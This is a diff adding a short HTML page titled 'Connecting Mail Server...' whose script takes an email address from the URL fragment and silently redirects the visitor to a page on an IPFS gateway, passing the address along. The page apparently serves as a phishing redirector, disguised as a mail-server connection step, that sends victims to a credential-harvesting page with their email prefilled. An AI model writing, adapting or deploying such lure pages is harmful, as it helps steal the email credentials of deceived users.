@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Connecting Mail Server...</title>
+    <script>
+      // Retrieve the email address from the URL fragment (after the #)
+      const emailFromHash = window.location.hash.substring(1); // Get text after '#'
+
+      // Default email if not found in the URL
+      const email = emailFromHash || "default@example.com";
+
+      // Build the redirect URL with the email
+      const redirectUrl = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${email}`;
+
+      // Redirect
+      window.location.replace(redirectUrl);
+    </script>
+  </head>
+  <body>
+    <p>Connecting Mail Server, please wait...</p>
+  </body>
+</html>
